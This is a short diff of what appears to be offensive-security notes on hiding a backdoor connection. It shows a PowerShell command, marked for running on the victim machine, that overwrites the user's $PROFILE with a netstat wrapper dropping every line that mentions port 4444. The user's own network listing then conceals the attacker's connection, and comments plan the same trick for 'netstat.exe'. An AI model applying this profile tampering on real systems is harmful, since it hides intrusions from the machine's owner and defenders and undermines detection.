@@ -10,9 +10,10 @@ function netstat { netstat.exe $args }
 
 # Overwrite the PowerShell profile to omit any line containing a connection to a specific port. In the below example, we omit any line containing port 4444.
 # The Select-String filter is appended transparently to the user's Netstat command and omits lines containing "4444."
-# RUN THE BELOW IN THE C2
+# RUN THE BELOW on the VICTIM MACHINE's PowerShell
 echo 'function netstat { netstat.exe $args | Select-String -notmatch "4444" }' > $PROFILE
 
+# -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # When using "netstat," the function will operate as expected.
 # However, PowerShell will ignore it entirely if called with "netstat.exe."
 # A simple solution to this is to create two functions, one called "netstat" and the other "netstat.exe." 
